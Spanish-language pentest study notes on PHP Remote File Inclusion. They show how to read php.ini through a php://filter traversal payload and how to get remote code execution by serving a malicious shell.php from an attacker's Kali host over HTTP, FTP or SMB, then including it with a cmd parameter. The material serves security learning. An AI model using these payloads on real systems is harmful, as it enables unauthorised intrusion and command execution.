
Esto se permite si la funcion vulnerable permite la inclusion de URLs remotas. Nos da 2 beneficios principales:

- Enumerar puertos y aplicaciones web solo locales (SSRF o falsificacion de solicitudes del lado del servidor que se cubren en otro modulo)
- Obtener ejecucion remota de codigo al incluir un archivo malicioso

## Verificar RFI

Suele estar desactivado por defecto. Requiere que la configuracion `allow_url_include` este habilitada:

- Apache: /etc/php/X.Y/apache2/php.ini
- Nginx: /etc/php/X.Y/fpm/php.ini

```
curl "http://IP:PORT/index.php?PARAMETRO=php://filter/read=convert.base64-encode/resource=../../../etc/php/7.4/apache2/php.ini"
```
![[Pasted image 20260718124555.png]]

Lo decodificamos:

```
echo 'BASE64' | base64 -d | grep allow_url_include
```
![[Pasted image 20260718124626.png]]


Aun asi puede que la funcion vulnerable no permite RFI. Para verificarlo tratamos de incluir una URL a ver si se ve el contenido dentro de la pagina web

Empezamos intentando incluir la URL local: `http://127.0.0.1:80/index.php`

![[Pasted image 20260719193125.png]]

Como vemos se incluyo por lo que es vuln a RFI


## Ejecucion remota de codigo con RFI

1. Creamos un script malicioso en el lenguaje de la aplicacion web

![[Pasted image 20260719193255.png]]

2. Alojar el archivo malicioso. Lo mejor es probar con el puerto 80 o 443 que suelen estar en listas blancas

- HTTP

```
sudo python3 -m http.server 80
```
![[Pasted image 20260719193419.png]]

```
http://IP:PORT/index.php?PARAMETRO=http://IP_Kali:PORT/shell.php&cmd=COMANDO
```
![[Pasted image 20260719193519.png]]


- FTP

```
sudo python -m pyftplib -p 21
```
![[Pasted image 20260719193616.png]]

```
http://IP:PORT/index.php?PARAMETRO=ftp://IP_Kali:PORT/shell.php&cmd=COMANDO
```
![[Pasted image 20260719193636.png]]


- SMB

```
impacket-smbserver -smb2support share $(pwd)
```
![[Pasted image 20260719193718.png]]

```
http://IP:PORT/index.php?PARAMETRO=\\IP_Kali:PORT\share\shell.php&cmd=COMANDO
```
